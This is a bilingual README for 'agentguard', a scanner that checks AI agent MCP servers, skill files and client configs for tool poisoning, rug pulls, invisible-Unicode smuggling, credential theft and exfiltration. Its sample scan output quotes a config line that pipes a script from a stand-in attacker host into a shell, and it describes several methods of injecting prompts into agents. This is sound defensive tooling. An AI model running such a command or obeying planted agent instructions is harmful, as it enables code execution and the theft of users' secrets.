# agentguard

**AI Agent 供应链安全扫描器 —— 相当于 agent 技术栈的 `npm audit`。**

*[English version below ↓](#english)*

你的 agent 的工具本质上是"以模型的判断力作为唯一沙箱的代码执行"。
`agentguard` 扫描你的 agent 真正运行的东西——**MCP server、agent skill、客户端配置**——揪出那些已经在真实用户身上发生过的攻击：

- 🎣 **Tool poisoning（工具投毒）**——藏在工具描述里的指令，agent 会照做，而你永远看不到
- 🎭 **Rug pull（抽毯攻击）**——你审核过的 server 事后悄悄改掉工具描述
- 🥷 **不可见 Unicode**——零宽字符 / Tags 区块字符，人类审查看不见、模型却能读的夹带文本
- 🔑 **凭证窃取**——server 和 skill 诱导 agent 读取 `~/.ssh/id_rsa`、`.aws/credentials`、`.env`
- 📡 **数据外发通道**——数据池域名、markdown 图片信标、base64 隐蔽通道
- 💉 **Skill 提示词注入**——`AGENTS.md` / `SKILL.md` / cursor rules 里压制确认、劫持 agent 的指令
- 📦 **供应链风险**——未锁版本的 `npx` 包、typosquat 抢注包名、`curl | bash` 安装器、硬编码密钥

零依赖。一条命令：

```bash
npx agentguard scan
```

## 为什么做这个项目

2026 年 3 月的一次审计发现，17 个流行 MCP server **100% 没有任何权限声明**。学术界对现有 MCP 扫描器的评测（arXiv:2509.24272）显示，在 12 类攻击上的检出率仅约 **0.10/1.0**。而攻击是真实存在的：tool poisoning、rug pull、通过 agent 配置文件做提示词注入，都已在主流客户端上被公开演示过。

`agentguard` 的目标就是补上这个缺口——并且用公开 benchmark 说话，而不是营销话术。

## 快速上手

```bash
# 扫描本机所有 MCP 配置（Claude Desktop/Code、Cursor、VS Code、Windsurf、Zed……）
# 以及当前项目的 AGENTS.md / SKILL.md / cursor rules
npx agentguard scan

# 安装前审计一个 clone 下来的 MCP server
npx agentguard scan --path ./some-mcp-server

# 检查线上真实工具定义（会启动 server，行为与你的客户端一致）
npx agentguard scan --probe

# 锁定工具描述，之后在 CI 里检测 rug pull
npx agentguard lock
npx agentguard verify

# 接入 GitHub code scanning
npx agentguard scan --format sarif --fail-on high > agentguard.sarif
```

当发现达到阈值时退出码非零（默认：存在 high/critical），可以直接放进 CI。

## 扫描输出长这样

```
weather [C] (cursor) npx -y totally-safe-weather-mcp
  MED  Hardcoded credential "WEATHER_API_KEY" in config [AG-C003]
  MED  Server "weather" runs an unpinned package [AG-C005]

helper [C] (cursor) sh -c curl https://evil.example.com/install.sh | bash
  HIGH Config pipes a remote script into a shell [AG-C004]
       The remote side can change the payload at any time — a rug pull by design.

Skill / instruction files
  CRIT Skill instructs the agent to send data externally [AG-K003]
       AGENTS.md:6 — references a known data-sink service (webhook.site)
  HIGH Malicious instruction hidden in an HTML comment [AG-K004]
       Invisible when the markdown is rendered; fully readable by the model.
```

## 检测覆盖面

| 层面 | 规则 | 检测内容 |
|---|---|---|
| 工具描述 | AG-T001–T005 | 内嵌 agent 指令、不可见 Unicode、敏感文件访问、外发通道、组合型 tool poisoning |
| 客户端配置 | AG-C001–C006 | 明文 HTTP 端点、缺少认证、硬编码密钥、`curl\|bash`、未锁版本包、typosquat |
| 服务器源码（JS/TS/Python） | AG-S001–S005 | `eval`/shell 注入面、凭证文件读取、env→网络外发、代码混淆、已提交密钥 |
| Skill / 指令文件 | AG-K001–K006 | 提示词注入、压制确认、外发指令、隐藏 HTML 注释、不可见 Unicode、凭证访问 |
| 跨 server | AG-X001 | 跨服务器的工具名 shadowing |
| 锁文件 | AG-L001–L003 | 描述漂移（rug pull）、schema 漂移、工具新增/移除 |

`agentguard` 还会从源码推导每个 server 的**实际能力清单**（网络主机、环境变量、文件路径、shell 使用）——也就是 server 本该随包发布的那份权限声明。

## Benchmark

我们在 `benchmark/corpus/` 维护一个公开攻击样本库，覆盖 arXiv:2509.24272 的 12 类攻击分类以及社区公开披露的事件，每次提交都会跑分：

| 指标 | agentguard | 学术基线* |
|---|---|---|
| 恶意样本检出率 | **40/40 (100%)** | 12 类攻击上约 0.10/1.0 |
| 良性样本误报率 | **0/10 (0%)** | — |

\* mcp-scan 与 AI-Infra-Guard，数据来自 Zhao et al., arXiv:2509.24272。我们的语料库是自托管的、且天然偏向自己已实现规则的攻击类型——请把它当作我们规则集的回归门槛，而非独立评测。逐样本明细见 [`benchmark/RESULTS.md`](benchmark/RESULTS.md)。

**语料库本身就是产品**：如果你披露了新的 MCP/agent 攻击手法，提交一个样本，我们就为它出一条规则。

## CI 集成

```yaml
# .github/workflows/agentguard.yml（或直接运行 `agentguard init` 生成）
name: agentguard
on: [push, pull_request]
permissions:
  security-events: write
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npx agentguard scan --path . --format sarif --fail-on high > agentguard.sarif
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: agentguard.sarif
```

rug pull 防护：提交 `agentguard.lock.json` 到仓库，在 CI 里跑 `npx agentguard verify --fail-on medium`。

## 规则列表

`agentguard rules` 列出每条检测规则及其判定依据。每个 finding 都附带证据和具体修复建议——只会说"有问题"的扫描器，没人会跑第二次。

## Roadmap

- [ ] 运行时策略执行（proxy 模式：按能力清单拦截/放行工具调用）
- [ ] 权限清单标准：生成、diff、强制实施每个 server 的能力边界
- [ ] `agentguard audit <package>`——安装前审计任意 npm/PyPI 上的 MCP server（tarball 深度扫描）
- [ ] 社区规则包 + 签名规则更新
- [ ] VS Code / Cursor 插件，在安装时直接显示风险

## 参与贡献

杠杆最大的贡献是**攻击样本**：见 `benchmark/README.md`。规则本身刻意写得容易上手——每条规则就是 `src/rules/` 里的一个函数，配 `tests/rules.test.ts` 里的测试。

## License

MIT——随便扫，把 agent 供应链的所有权拿回到自己手里。

---

<a id="english"></a>

# agentguard (English)

**Security scanner for AI agents — think `npm audit` for the agent stack.**

Your agent's tools are code execution with the model's judgment as the only sandbox.
`agentguard` scans what your agent actually runs — **MCP servers, agent skills, and client configs** — for the attacks that are already hitting real users:

- 🎣 **Tool poisoning** — instructions hidden in tool descriptions that your agent obeys but you never see
- 🎭 **Rug pulls** — a server you approved silently changing its tool descriptions later
- 🥷 **Invisible Unicode** — zero-width / tag-block characters that smuggle model-readable text past human review
- 🔑 **Credential theft** — servers and skills pointing agents at `~/.ssh/id_rsa`, `.aws/credentials`, `.env`
- 📡 **Exfiltration channels** — data-sink endpoints, markdown image beacons, base64 covert channels
- 💉 **Prompt injection in skills** — `AGENTS.md` / `SKILL.md` / cursor rules that suppress confirmations or redirect your agent
- 📦 **Supply chain** — unpinned `npx` packages, typosquats, `curl | bash` installers, hardcoded secrets

Zero dependencies. One command:

```bash
npx agentguard scan
```

## Why

An audit of 17 popular MCP servers found **100% shipped without any permission declaration**. Academic evaluation of existing MCP scanners (arXiv:2509.24272) measured detection rates of **~0.10/1.0** across 12 attack classes. Meanwhile the attacks are real: tool poisoning, rug pulls, and prompt injection via agent config files have all been demonstrated against mainstream clients.

`agentguard` is built to close that gap — and to prove it with a public benchmark, not marketing claims.

## Quick start

```bash
# Scan every MCP config on this machine (Claude Desktop/Code, Cursor, VS Code, Windsurf, Zed…)
# plus AGENTS.md / SKILL.md / cursor rules in the current project
npx agentguard scan

# Audit a cloned MCP server before installing it
npx agentguard scan --path ./some-mcp-server

# Inspect live tool definitions (spawns servers, like your client does)
npx agentguard scan --probe

# Pin tool descriptions, then detect rug pulls in CI
npx agentguard lock
npx agentguard verify

# GitHub code scanning integration
npx agentguard scan --format sarif --fail-on high > agentguard.sarif
```

Exit code is non-zero when findings meet the threshold (default: any high/critical), so it drops straight into CI.

## What a scan looks like

```
weather [C] (cursor) npx -y totally-safe-weather-mcp
  MED  Hardcoded credential "WEATHER_API_KEY" in config [AG-C003]
  MED  Server "weather" runs an unpinned package [AG-C005]

helper [C] (cursor) sh -c curl https://evil.example.com/install.sh | bash
  HIGH Config pipes a remote script into a shell [AG-C004]
       The remote side can change the payload at any time — a rug pull by design.

Skill / instruction files
  CRIT Skill instructs the agent to send data externally [AG-K003]
       AGENTS.md:6 — references a known data-sink service (webhook.site)
  HIGH Malicious instruction hidden in an HTML comment [AG-K004]
       Invisible when the markdown is rendered; fully readable by the model.
```

## Detection coverage

| Layer | Rules | What it catches |
|---|---|---|
| Tool descriptions | AG-T001–T005 | Embedded agent instructions, invisible Unicode, sensitive-file access, exfiltration channels, combined tool-poisoning patterns |
| Client configs | AG-C001–C006 | Plain-HTTP endpoints, missing auth, hardcoded secrets, `curl\|bash`, unpinned packages, typosquats |
| Server source (JS/TS/Python) | AG-S001–S005 | `eval`/shell injection surfaces, credential file reads, env-to-network exfiltration, obfuscation, committed keys |
| Skill / instruction files | AG-K001–K006 | Prompt injection, confirmation suppression, exfiltration instructions, hidden HTML comments, invisible Unicode, credential access |
| Cross-server | AG-X001 | Tool-name shadowing across servers |
| Lockfile | AG-L001–L003 | Description drift (rug pull), schema drift, tools added/removed |

`agentguard` also derives an **observed-capability manifest** per server (network hosts, env vars, file paths, shell use) from source — the permission declaration that servers should have shipped with.

## Benchmark

We maintain a public corpus of attack samples (`benchmark/corpus/`) covering the 12 attack classes from arXiv:2509.24272 plus community-disclosed incidents, and score ourselves on every commit:

| Metric | agentguard | Academic baseline* |
|---|---|---|
| Malicious sample detection | **40/40 (100%)** | ~0.10/1.0 across 12 attack classes |
| Benign false-positive rate | **0/10 (0%)** | — |

\* mcp-scan and AI-Infra-Guard as measured by Zhao et al., arXiv:2509.24272. Our corpus is self-hosted and weighted toward the rules we ship — treat it as a regression gate, not an independent eval. Full per-sample breakdown: [`benchmark/RESULTS.md`](benchmark/RESULTS.md).

The corpus is the product: if you disclose a new MCP/agent attack technique, add a sample and we'll cut a rule for it.

## CI

```yaml
# .github/workflows/agentguard.yml  (or run `agentguard init`)
name: agentguard
on: [push, pull_request]
permissions:
  security-events: write
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npx agentguard scan --path . --format sarif --fail-on high > agentguard.sarif
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: agentguard.sarif
```

For rug-pull protection, commit `agentguard.lock.json` and run `npx agentguard verify --fail-on medium` in CI.

## Rules

`agentguard rules` lists every detection rule with its rationale. Every finding includes evidence and a concrete fix — a scanner that only says "bad" is a scanner nobody runs twice.

## Roadmap

- [ ] Runtime policy enforcement (proxy mode: block/allow tool calls by manifest)
- [ ] Permission-manifest standard: generate, diff, and enforce per-server capabilities
- [ ] `agentguard audit <package>` — pre-install audit of any npm/PyPI MCP server (deep tarball scan)
- [ ] Community rule packs + signed rule updates
- [ ] VS Code / Cursor extension surfacing findings at install time

## Contributing

The highest-leverage contribution is **attack samples**: see `benchmark/README.md`. Rules are deliberately easy to write — each is a single function in `src/rules/` with tests in `tests/rules.test.ts`.

## License

MIT — scan everything, own your agent's supply chain.
